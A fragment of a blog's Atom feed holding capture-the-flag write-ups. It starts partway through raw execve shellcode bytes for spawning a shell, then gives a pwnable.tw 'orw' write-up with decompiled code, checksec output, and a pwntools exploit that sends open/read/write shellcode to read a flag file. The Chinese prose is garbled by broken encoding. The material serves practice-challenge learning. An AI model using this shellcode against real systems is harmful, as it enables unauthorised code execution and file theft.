class="string">b&quot;\x31\xc0\x50\x68\x2f\x2f\x73&quot;</span>\</span><br><span class="line">                  <span class="string">b&quot;\x68\x68\x2f\x62\x69\x6e\x89&quot;</span>\</span><br><span class="line">                  <span class="string">b&quot;\xe3\x89\xc1\x89\xc2\xb0\x0b&quot;</span>\</span><br><span class="line">                  <span class="string">b&quot;\xcd\x80\x31\xc0\x40\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#payload+=asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>pwnable orwå¤ç°</title>
    <link href="https://www.fomal.cc/posts/46c31b8d.html"/>
    <id>https://www.fomal.cc/posts/46c31b8d.html</id>
    <published>2023-04-02T03:02:22.690Z</published>
    <updated>2023-04-02T03:03:01.991Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ä¼ªä»£ç ">1.ä¼ªä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">orw_seccomp</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">&#125;<span class="comment">//ä»…é™fopen(),write(),read()</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give my your shellcode:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">200u</span>);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-æ¼æ´åˆ†æ">2.æ¼æ´åˆ†æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>é¦–å…ˆchecksecå‘ç°åªå¼€å¯äº†canaryé˜²æŠ¤.åç¼–è¯‘å‘ç°ç¨‹åºä¼šä»æ ‡å‡†è¾“å…¥è¯»å…¥ä¸€ä¸ªå…¨å±€å˜é‡shellcode,å¹¶ä¸”åœ¨ä¹‹åæ‰§è¡Œshellcode,ä¸è¿‡å‡ºé¢˜äººä½¿ç”¨äº†æ‰‹æ®µæŠŠ<code>sys_cve()</code>å±è”½äº†,ä¸è¿‡ç•™ä¸‹äº†orwå‡½æ•°å¯ä»¥è°ƒç”¨,è€Œä¸”è¿˜ç»™å‡ºäº†å¯¹åº”flagçš„è·¯å¾„.æ€è·¯æ‰“å¼€,æˆ‘ä»¬å¸ƒç½®ä¸€æ®µæ‰“å¼€å¯¹åº”è·¯å¾„çš„flagæ–‡ä»¶,å°†å®ƒè¯»å…¥åˆ°ç¼“å†²åŒºä¸­ç„¶åè¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºå°±å¯ä»¥è·å–flagäº†.</p><h2 id="3-exp">3.exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="number">0x0804A060</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/home/orw/flag&quot;</span>))</span><br><span class="line">shellcode+=asm(shellcraft.read(<span class="number">3</span>,buffer,<span class="number">0x60</span>)) <span class="comment">#æ–‡ä»¶æè¿°ç¬¦ä»3å¼€å§‹,3å°±æ˜¯ä»£è¡¨flagæ–‡ä»¶</span></span><br><span class="line">shellcode+=asm(shellcraft.write(<span class="number">1</span>,buffer,<span class="number">0x60</span>))</span><br><span class="line">io.sendafter(<span class="string">&#x27;:&#x27;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-ä¼ªä»£ç &quot;&gt;1.ä¼ªä»£ç &lt;/h2&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2</summary>
      
    
    
    
    
  </entry>
  
</feed>
